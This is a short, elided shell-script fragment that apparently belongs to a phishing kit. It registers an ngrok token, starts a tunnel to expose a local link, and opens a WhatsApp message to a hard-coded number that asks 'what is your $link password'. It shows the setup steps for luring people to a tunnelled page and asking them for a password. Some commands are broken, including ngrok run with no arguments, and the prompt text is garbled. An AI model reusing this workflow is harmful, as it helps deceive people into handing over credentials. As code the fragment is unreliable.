...
echo "		please wait till it install "
...
echo "			take authtoken from your ngrok account" |lolcat
xdg-open https://dashboard.ngrok.com/
read -p " your token = " token



ngrok authtoken $token

echo " this is your host link "
echo " gave the link " 

ngrok

read -p " animate the  link = " link

xdg-open https://api.whatsapp.com/send?phone=12093158769&text=Hi%20bro%20what%20is%20your%20$link%20password%20%0A%0A
